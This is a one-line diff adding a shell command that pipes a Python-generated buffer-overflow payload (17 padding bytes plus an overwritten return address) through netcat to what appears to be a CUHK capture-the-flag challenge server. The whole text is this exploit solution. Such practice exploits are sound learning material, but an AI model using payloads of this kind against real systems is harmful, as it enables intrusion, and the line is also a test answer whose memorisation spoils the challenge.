@@ -1,0 +1,2 @@
+python -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAA\x76\x11\x40\x00\x00');exit()" | nc chal.24.cuhkctf.org 24061
+
